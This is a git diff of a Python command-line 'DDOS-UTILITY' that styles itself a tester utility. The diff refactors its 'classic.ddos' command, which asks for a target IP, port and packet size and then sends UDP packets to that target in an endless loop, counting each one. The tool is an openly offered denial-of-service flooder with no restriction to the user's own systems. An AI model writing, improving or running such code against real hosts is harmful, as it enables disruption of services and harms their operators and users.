@@ -9,7 +9,6 @@ class Init():
 
       self.loading()
 
-      self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       print(" \n" + Fore.LIGHTRED_EX + " ██████╗ ██████╗  █████╗  ██████╗      ██╗   ██╗████████╗██╗██╗      \n" + " ██╔══██╗██╔══██╗██╔══██╗██╔════╝      ██║   ██║╚══██╔══╝██║██║      \n" + " ██║  ██║██║  ██║██║  ██║╚█████╗ █████╗██║   ██║   ██║   ██║██║      \n" + " ██║  ██║██║  ██║██║  ██║ ╚═══██╗╚════╝██║   ██║   ██║   ██║██║     \n"+  " ██████╔╝██████╔╝╚█████╔╝██████╔╝      ╚██████╔╝   ██║   ██║███████╗ \n" + " ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝        ╚═════╝    ╚═╝   ╚═╝╚══════╝ \n" + Fore.LIGHTRED_EX + "\n" + "        DDOS-UTILITY -- BY SRGWRTG0342\n" + "        A TESTER UTILITY\n" )
       
       self.commandline()
@@ -25,10 +24,10 @@ class Init():
           print(Fore.LIGHTYELLOW_EX + "\n         Commands: \n" + "           classic.ddos - Classic method script\n")
 
         if commandline == "classic.ddos":
-
+          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
           print(Fore.LIGHTYELLOW_EX + "\n      DDOS UTILITY" + " Starter")
-          self.ip = input( Fore.LIGHTYELLOW_EX + "\n     IP >>> ")
-          self.port = input( Fore.LIGHTYELLOW_EX + "     PORT >>> ")
+          ip = input( Fore.LIGHTYELLOW_EX + "\n     IP >>> ")
+          port = input( Fore.LIGHTYELLOW_EX + "     PORT >>> ")
           numbytes = input( Fore.LIGHTYELLOW_EX + "     PACKET SIZE(bytes) >>>")
           numbytes = int(numbytes)
 
@@ -43,9 +42,9 @@ class Init():
           sent = 0
 
           while True:
-            self.sock.sendto(bytes, (self.ip,self.port))
+            sock.sendto(bytes, ( ip, port))
             sent = sent + 1
-            print ("Send %s packets %s to port:%s"%(sent,self.ip,self.port))
+            print ("Send %s packets %s to port:%s"%(sent,ip,port))
     except:
       print("Exit!")
   def loading(self):
